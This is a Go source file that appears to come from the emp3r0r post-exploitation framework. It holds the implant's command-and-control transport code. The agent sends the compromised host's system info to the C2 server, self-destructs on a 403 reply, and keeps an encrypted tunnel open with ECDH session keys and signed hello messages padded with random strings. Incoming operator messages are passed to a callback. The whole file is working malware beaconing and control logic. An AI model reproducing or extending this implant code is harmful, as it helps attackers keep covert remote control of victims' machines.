package c2transport

import (
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"os"
	"os/signal"
	"strings"
	"sync"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/preflight"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// ReportStatus poll CC server and report its system info
func ReportStatus(config *def.Config, info *def.Emp3r0rAgent) (err error) {
	// The C2 protocol is transport-agnostic: routing is done by MsgAuth.Capabilities
	// inside the CBOR frame — not by URL path. We dial the single C2 endpoint.
	reportStatusURL := def.CCAddress
	logging.Infof("Collected system info, now reporting status to %s", reportStatusURL)

	conn, _, _, err := EstablishC2Connection(reportStatusURL, "", common.RuntimeConfig.C2Routes.Checkin)
	if err != nil {
		if strings.Contains(err.Error(), "bad status code: 403") {
			return fmt.Errorf("self-destruct")
		}
		return err
	}
	defer conn.Close()

	// Global Encryption: Wrap connection with PSK
	// Note: EstablishC2Connection already wraps with SecureConn before sending MsgAuth.
	// Here we need a fresh SecureConn for the agent data payload that follows.
	secureConn := transport.NewSecureConn(conn)

	out := cbor.NewEncoder(secureConn)
	err = out.Encode(info)
	if err != nil {
		return fmt.Errorf("encode agent info: %v", err)
	}

	// Wait for ACK from server
	// This ensures the server has processed our check-in before we close the connection
	// especially important for polling-based transports like http_poll
	dec := cbor.NewDecoder(secureConn)
	var ack def.MsgTunData
	if err = dec.Decode(&ack); err != nil {
		return fmt.Errorf("decode checkin ACK: %v", err)
	}
	if ack.Tag != "checkin-ok" {
		return fmt.Errorf("invalid checkin ACK tag: %s", ack.Tag)
	}

	logging.Infof("Checked in (verified by server)")
	return nil
}

// CheckC2Condition check preflight
func CheckC2Condition(proxy string) bool {
	// If Preflight not enabled, return true (Pass)
	if !common.RuntimeConfig.PreflightEnabled {
		return true
	}

	// Use Preflight Client
	return preflight.Check(common.RuntimeConfig)
}

func catchInterruptAndExit(ctx context.Context, cancel context.CancelFunc) {
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	select {
	case <-sig:
		logging.Infof("Cancelling due to interrupt")
		cancel()
		os.Exit(0)
	case <-ctx.Done():
		signal.Stop(sig)
		return
	}
}

// HandShakes record each hello message and C2's reply
var HandShakes sync.Map // map[string]bool

// MsgTunneler use the connection (conn)
func MsgTunneler(conn io.ReadWriteCloser, config *def.Config, callback func(*def.MsgTunData), ctx context.Context, cancel context.CancelFunc) error {
	// Global Encryption: Wrap connection
	secureConn := transport.NewSecureConn(conn)
	def.CCMsgConn = secureConn

	var (
		in            = cbor.NewDecoder(secureConn)
		out           = cbor.NewEncoder(secureConn)
		handshakeDone = false
	)
	go catchInterruptAndExit(ctx, cancel)
	defer func() {
		go func() {
			defer func() {
				if r := recover(); r != nil {
					logging.Errorf("MsgTunneler closing panic: %v\n%s", r, util.CallStack())
				}
			}()
			if closeErr := conn.Close(); closeErr != nil {
				logging.Print("MsgTunneler closing: ", closeErr)
			}
		}()

		cancel()
		logging.Print("MsgTunneler closed")
	}()

	// Generate Ephemeral Key Pair for this session
	privKey, err := transport.GenerateEphemeralKeyPair()
	if err != nil {
		return fmt.Errorf("failed to generate ephemeral key pair: %v", err)
	}
	pubKeyBytes := transport.SerializePublicKey(&privKey.PublicKey)

	// check for CC server's response
	go func() {
		defer func() {
			if r := recover(); r != nil {
				logging.Errorf("MsgTunneler response listener panic: %v\n%s", r, util.CallStack())
			}
			cancel()
		}()
		// Track if we have already exchanged keys in this session
		var pfsKeysExchanged bool
		logging.Infof("Check CC response: started")
		for ctx.Err() == nil {
			// read response
			// all messages are now structured MsgTunData
			var msg def.MsgTunData
			if decodeErr := in.Decode(&msg); decodeErr != nil {
				if !strings.Contains(decodeErr.Error(), "context canceled") && decodeErr != io.EOF {
					logging.Print("Check CC response: CBOR msg decode: ", decodeErr)
				}
				break
			}

			// if it's a handshake reply
			if msg.Tag == "handshake" {
				// Only mark a hello as answered if sendHello is actually waiting
				// on this JobID. Otherwise a late/unsolicited reply would leak an
				// entry into HandShakes forever.
				_, waiting := HandShakes.Load(msg.JobID)
				if pfsKeysExchanged {
					// We already have the keys, this is likely a keep-alive from server (random data)
					// Notify wait_hello that handshake is done/alive
					if waiting {
						HandShakes.Store(msg.JobID, true)
					}
					continue
				}

				// 1. Parse Server's Public Key
				serverPubKey, err := transport.DeserializePublicKey(msg.Response)
				if err != nil {
					logging.Errorf("Failed to deserialize server public key: %v", err)
					continue
				}

				// 2. Derive Shared Secret (ECDH)
				sharedSecret, err := transport.PerformECDH(privKey, serverPubKey)
				if err != nil {
					logging.Errorf("Failed to perform ECDH: %v", err)
					continue
				}

				// 3. Derive Session Key (HKDF)
				sessionKey, err := transport.DeriveSessionKey(sharedSecret, config.AgentUUID)
				if err != nil {
					logging.Errorf("Failed to derive session key: %v", err)
					continue
				}

				// 4. Switch SecureConn to new Session Key
				secureConn.SetKey(sessionKey)
				logging.Successf("SecureConn: Switched to ephemeral session key (PFS enabled)")
				pfsKeysExchanged = true

				// Notify wait_hello that handshake is done
				if waiting {
					HandShakes.Store(msg.JobID, true)
				}
				continue
			}

			// process CC data; copy to avoid concurrent reuse of msg in next loop
			msgCopy := msg
			go callback(&msgCopy)
		}
		logging.Infof("Check CC response: exited")
	}()

	wait_hello := func(hello_id string) bool {
		// delete key, forget about this hello when we are done
		defer HandShakes.Delete(hello_id)
		// wait until timeout or success
		for range config.CCTimeout {
			if ctx.Err() != nil {
				return false
			}
			// if hello marked as success, return true
			isSuccessAny, _ := HandShakes.Load(hello_id)
			isSuccess, _ := isSuccessAny.(bool)
			if isSuccess {
				return true
			}
			util.TakeABlink()
		}
		logging.Warningf("Hello (%s) timeout. Please check your network connection.", hello_id)
		return false
	}

	sendHello := func(cnt int) bool {
		var hello_msg def.MsgTunData
		// try cnt times then exit
		for cnt > 0 {
			if ctx.Err() != nil {
				return false
			}
			cnt-- // consume cnt

			// send hello
			hello_msg.CmdSlice = []string{util.RandStr(util.RandInt(1, 100))}
			hello_msg.JobID = uuid.NewString()
			hello_msg.Tag = config.AgentTag
			hello_msg.AgentUUID = config.AgentUUID
			hello_msg.Time = time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST")
			if !handshakeDone {
				hello_msg.EphemPublicKey = pubKeyBytes // Send our ephemeral public key
			}

			// Dynamic TOFU: Sign UUID with Agent Key for session authentication
			sig, err := agentutils.SignWithAgentKey([]byte(config.AgentUUID))
			if err != nil {
				logging.Errorf("SignWithAgentKey: %v", err)
				util.TakeABlink()
				continue
			}
			hello_msg.AgentUUIDSig = base64.URLEncoding.EncodeToString(sig)

			// Mark the hello as pending BEFORE writing it. In polling transports
			// (http_poll) the server can reply before out.Encode returns, so
			// storing after Encode could overwrite the success marker with false
			// and make wait_hello hang forever.
			HandShakes.Store(hello_msg.JobID, false)
			if encodeErr := out.Encode(hello_msg); encodeErr != nil {
				HandShakes.Delete(hello_msg.JobID)
				logging.Errorf("agent cannot connect to cc: %v", encodeErr)
				util.TakeABlink()
				continue
			}

			if !wait_hello(hello_msg.JobID) {
				cancel()
				break
			}
			return true
		}
		return false
	}

	// keep connected
	for ctx.Err() == nil {
		if !sendHello(util.RandInt(1, 10)) {
			logging.Errorf("sendHello failed")
			break
		}
		handshakeDone = true
		util.TakeASnap()
	}

	return fmt.Errorf("MsgTunneler closed: %v", ctx.Err())
}
